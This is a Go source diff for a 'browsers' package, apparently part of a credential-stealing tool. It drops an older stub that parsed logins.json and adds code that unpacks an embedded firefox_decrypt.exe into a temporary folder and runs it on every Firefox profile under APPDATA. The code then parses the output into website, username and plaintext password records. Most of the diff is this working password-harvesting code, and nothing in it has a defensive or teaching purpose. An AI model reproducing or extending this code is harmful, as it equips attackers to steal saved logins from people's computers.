@@ -1,232 +1,108 @@
 package browsers
 
 import (
-	"database/sql"
-	"encoding/json"
 	"fmt"
 	"os"
-
-	_ "github.com/mattn/go-sqlite3"
+	"os/exec"
+	"path/filepath"
+	"regexp"
+	"smile/static"
+	"strings"
 )
 
 var (
-	FIREFOX_PROFILE_PATH = fmt.Sprintf("%s/Mozilla/Firefox/Profiles", APPDATA)
-	NSS_PATH             = fmt.Sprintf("%s/Mozilla Firefox", PROGRAMFILES)
-	NSS_PATH_86          = fmt.Sprintf("%s (x86)/Mozilla Firefox", PROGRAMFILES)
-	// RequiredFiles = []string{ "key3.db", "key4.db", "logins.json" }
+	FIREFOX_PROFILES = filepath.Join(APPDATA, "Mozilla", "Firefox", "Profiles")
 )
 
-func Firefox() BrowserConfig {
-	credentials := BrowserConfig{
-		Browser:     "firefox",
-		Credentials: []Credential{},
-	}
+func Firefox() []Credential {
+	credentials := []Credential{}
 
-	// first, get the nss3.dll path
-	// next, get the key3.db or key4.db file
-	// next, get the logins.json file
-	// next, parse the logins.json file
-	// next, decrypt the password
-	// next, add the credential to the credentials slice
-
-	nssPath, err := getNSSDLL()
+	// Copy the static content to a temporary directory
+	tempDir, err := copyStaticToTemp()
 	if err != nil {
-		fmt.Println(err.Error())
+		fmt.Println("Error copying static to temp:", err)
 		return credentials
 	}
-	fmt.Println(nssPath)
+	defer os.RemoveAll(tempDir)
 
-	err = getMozLoginData(&credentials)
+	// Access the embedded firefox_decrypt.exe file from the temporary directory
+	tempExePath := filepath.Join(tempDir, "firefox_decrypt.exe")
+
+	// Get all profiles
+	profiles, err := exec.Command(`cmd`, `/c`, `dir`, FIREFOX_PROFILES, `/b`).Output()
 	if err != nil {
-		fmt.Println(err.Error())
+		fmt.Println("Error getting profiles:", err)
 		return credentials
+	}
+
+	re := regexp.MustCompile(`\s+`)
+	profileSplit := re.Split(string(profiles), -1)
+	for _, profile := range profileSplit {
+		if profile == "" {
+			continue
+		}
+		cmd := exec.Command("cmd", "/C", tempExePath, filepath.Join(FIREFOX_PROFILES, profile))
+		out, err := cmd.Output()
+		if err != nil {
+			fmt.Println("Error executing command:", err)
+			return credentials
+		}
+
+		for _, line := range strings.Split(string(out), "\n") {
+			reURL := regexp.MustCompile("^Website: ")
+			reUser := regexp.MustCompile("^Username: ")
+			rePass := regexp.MustCompile("^Password: ")
+			if reURL.MatchString(line) {
+				credentials = append(credentials, Credential{
+					Browser: "Firefox",
+					URL:     strings.Replace(line, "Website: ", "", -1),
+				})
+			} else if reUser.MatchString(line) {
+				re := regexp.MustCompile("^Username: |'")
+				line = re.ReplaceAllString(line, "")
+				credentials[len(credentials)-1].Username = line
+			} else if rePass.MatchString(line) {
+				re := regexp.MustCompile("^Password: |'")
+				line = re.ReplaceAllString(line, "")
+				credentials[len(credentials)-1].Password = line
+			}
+		}
 	}
 
 	return credentials
 }
 
-func getMozLoginData(credentials *BrowserConfig) error {
-	dirs, err := os.ReadDir(FIREFOX_PROFILE_PATH)
+func copyStaticToTemp() (string, error) {
+	// Access the embedded static directory
+	staticDir := "/firefox_decrypt/"
+
+	// Get the list of all files and directories in the embedded static directory
+	files, err := static.WalkDirs(staticDir, false)
 	if err != nil {
-		fmt.Println(err.Error())
-		return err
+		return "", fmt.Errorf("error walking static directory: %v", err)
 	}
 
-	finalErr := fmt.Errorf("profile not found")
-	for _, dir := range dirs {
-		profilePath := fmt.Sprintf("%s/%s", FIREFOX_PROFILE_PATH, dir.Name())
-		profileDir, err := os.ReadDir(profilePath)
-		if err != nil {
-			continue
-		}
-
-		for _, file := range profileDir {
-			if file.Name() == "logins.json" {
-				finalErr = nil
-				// nssDBArr, err := getNSSPrivate(profilePath);
-				// if err != nil {
-				// 	fmt.Println(err.Error())
-				// 	return credentials
-				// }
-
-				// fmt.Println(nssDBArr)
-				parseCredentials(profilePath, credentials)
-				break
-			}
-		}
-	}
-	return finalErr
-}
-
-func getNSSDLL() (string, error) {
-	if _, err := os.Stat(NSS_PATH + "/nss3.dll"); err == nil {
-		return NSS_PATH, nil
-	} else if _, err := os.Stat(NSS_PATH_86 + "/nss3.dll"); err == nil {
-		return NSS_PATH_86, nil
-	} else {
-		fmt.Println("Firefox not found")
-		return "", fmt.Errorf("Firefox not found")
-	}
-}
-
-func parseCredentials(profilePath string, credentials *BrowserConfig) {
-	// Read the logins.json file
-	loginsFile, err := os.ReadFile(fmt.Sprintf("%s/logins.json", profilePath))
+	tempDir, err := os.MkdirTemp("", "static_")
 	if err != nil {
-		fmt.Println(err.Error())
-		return
+		return "", fmt.Errorf("error creating temporary directory: %v", err)
 	}
 
-	// Parse the JSON from logins.json
-	var loginsData map[string]interface{}
-	if err := json.Unmarshal(loginsFile, &loginsData); err != nil {
-		fmt.Println(err.Error())
-		return
-	}
-
-	// Extract the encrypted_key from the Local State data
-	logins, ok := loginsData["logins"].([]interface{})
-	if !ok {
-		fmt.Println("logins not found in logins.json")
-		return
-	}
-
-	for _, login := range logins {
-		loginData, ok := login.(map[string]interface{})
-		if !ok {
-			fmt.Println("login not found in logins.json")
-			continue
-		}
-
-		// Extract the hostname
-		url, _ := loginData["hostname"].(string)
-		encryptedUsername, _ := loginData["encryptedUsername"].(string)
-		encryptedPassword, _ := loginData["encryptedPassword"].(string)
-
-		// Decrypt the username and password
-		username, err := decryptMozData(encryptedUsername, profilePath)
-		if err != nil {
-			fmt.Println(err.Error())
-		}
-
-		password, err := decryptMozData(encryptedPassword, profilePath)
-		if err != nil {
-			fmt.Println(err.Error())
-		}
-
-		// Add the credential to the credentials slice
-		credentials.Credentials = append(credentials.Credentials, Credential{
-			URL:      url,
-			Username: username,
-			Password: password,
-		})
-	}
-
-}
-
-type nssPrivate struct {
-	a11  string
-	a102 string
-}
-
-func getNSSPrivate(path string) ([]nssPrivate, error) {
-	var keyFile string
-	if _, err := os.Stat(path + "/key4.db"); err == nil {
-		keyFile = path + "/key4.db"
-	} else if _, err := os.Stat(path + "/key3.db"); err == nil {
-		keyFile = path + "/key3.db"
-	} else {
-		return nil, fmt.Errorf("key file not found")
-	}
-
-	// create temp file
-	tempFile, err := os.CreateTemp("", "firefox_key_*.db")
-	if err != nil {
-		fmt.Println(err.Error())
-		return nil, err
-	}
-	defer os.Remove(tempFile.Name())
-
-	// copy key file to temp file
-	fileBytes, err := os.ReadFile(keyFile)
-	if err != nil {
-		fmt.Println(err.Error())
-		return nil, err
-	}
-	err = os.WriteFile(tempFile.Name(), fileBytes, 0644)
-	if err != nil {
-		fmt.Println(err.Error())
-	}
-
-	// read sqlite3 database
-	db, err := sql.Open("sqlite3", tempFile.Name())
-	if err != nil {
-		fmt.Println(err.Error())
-		return nil, err
-	}
-	defer db.Close()
-
-	// Ping the database
-	err = db.Ping()
-	if err != nil {
-		fmt.Println(err.Error())
-		return nil, err
-	}
-
-	// Query the database for content of nssPrivate
-	rows, err := db.Query("SELECT a11, a102 FROM nssPrivate")
-	if err != nil {
-		fmt.Println(err.Error())
-		return nil, err
-	}
-
-	// create list of objects for to store data
-	var nssDBArr []nssPrivate
-
-	// Iterate over the rows
-	for rows.Next() {
-		var a11 string
-		var a102 string
-
-		err = rows.Scan(&a11, &a102)
+	for _, file := range files {
+		fmtFile := strings.Replace(file, "/firefox_decrypt/", "", 1)
+		fileSplit := strings.Split(fmtFile, "/")
+		dirPath := strings.Join(fileSplit[:len(fileSplit)-1], "/")
+		os.Mkdir(filepath.Join(tempDir, dirPath), os.ModePerm)
+		fileByte, err := static.ReadFile(file)
 		if err != nil {
 			fmt.Println(err.Error())
 			continue
 		}
-
-		nssDBArr = append(nssDBArr, nssPrivate{
-			a11:  a11,
-			a102: a102,
-		})
+		err = os.WriteFile(filepath.Join(tempDir, fmtFile), fileByte, os.ModePerm)
+		if err != nil {
+			fmt.Println(err.Error())
+			continue
+		}
 	}
 
-	return nssDBArr, nil
-}
-
-func decryptMozData(ciphertext string, profilePath string) (string, error) {
-	if ciphertext == "" {
-		return "", nil
-	}
-
-	return ciphertext, nil
+	return tempDir, nil
 }
